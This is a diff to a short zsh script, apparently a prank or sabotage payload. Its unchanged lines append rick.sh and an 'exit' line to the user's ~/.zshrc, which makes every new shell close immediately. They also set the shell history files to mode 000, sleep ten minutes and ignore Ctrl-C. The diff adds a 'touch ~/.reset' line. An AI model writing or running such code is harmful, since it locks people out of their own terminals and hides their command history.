@@ -1,6 +1,7 @@
 #!/bin/zsh
 cat ./rick.sh >> ~/.zshrc
 echo -e 'exit' >> ~/.zshrc
+touch ~/.reset
 chmod 000 ~/.zsh_history ~/.bash_history && clear
 sleep 600
 trap ' ' 2
